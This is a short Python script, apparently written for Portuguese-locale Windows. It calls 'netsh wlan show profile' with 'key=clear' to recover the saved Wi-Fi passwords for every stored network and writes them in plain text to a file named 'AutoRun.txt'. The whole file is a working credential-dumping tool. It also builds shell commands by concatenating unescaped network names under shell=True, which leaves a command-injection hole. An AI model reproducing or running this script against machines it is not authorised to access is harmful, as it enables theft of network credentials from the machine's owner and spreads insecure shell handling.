# -*- coding: utf-8 -*-
from subprocess import check_output
import re

LIST_USER_PASS = []

def get_user_pass():
        list_lines_pass = []
        # executa o comando para pegar os nomes das redes ja conectados!
        SSIDs = check_output('netsh wlan show profile | findstr /c:"Todos os Perfis de Usuários:"', shell=True, encoding="437")
        # filtra a saida e faz uma lista de nomes
        SSIDs = SSIDs.split("Todos os Perfis de Usuários: ")
        lista_wifi_nomes = []
        for WifiName in  SSIDs:
                if WifiName != "":
                        lista_wifi_nomes.append(WifiName[:-1])

        for wifi_name in lista_wifi_nomes:
                
                infos_wifi = check_output('netsh wlan show profile key=clear name="' + wifi_name + '"', shell=True, encoding="437")
                infos_wifi = infos_wifi.split("\n")
                list_lines_pass.append(infos_wifi[32])
        
        list_of_passw = filter_pass(list_lines_pass)
        j = 0
        for i in list_of_passw:
                LIST_USER_PASS.append(lista_wifi_nomes[j] + " : " + i)
                j = j + 1
        
def filter_pass(list_pass):
        temp_list = []
        for i in list_pass:
                temp_list.append(i.replace(" ", "").split(":")[1])
        return temp_list

def criar_arquivo_de_senhas():
        arq = open("AutoRun.txt", "w")
        arq.write("--------- WIFI PASSWORDS ---------\n")
        for i in LIST_USER_PASS:
                arq.write(i)
                arq.write("\n")
        arq.close()

if __name__ == "__main__":
        get_user_pass()
        criar_arquivo_de_senhas()
